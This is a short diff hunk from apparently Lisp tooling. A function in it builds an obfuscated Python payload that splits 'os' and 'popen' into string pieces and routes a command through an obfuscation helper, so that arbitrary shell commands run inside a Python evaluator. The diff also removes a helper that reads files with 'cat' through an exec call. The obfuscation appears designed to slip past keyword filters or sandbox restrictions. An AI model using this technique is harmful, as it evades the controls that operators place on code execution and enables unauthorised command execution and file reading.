@@ -17,6 +17,3 @@
   (code/eval-python
    (format nil  "print(globals()['o'+'s'].__dict__['po'+'pen'](~a).__dict__['_stream'].__getattribute__('re'+'ad')())"
            (code/obfuscate command))))
-
-(defun code/read (file)
-  (use :exec (format nil "cat ~a" file)))
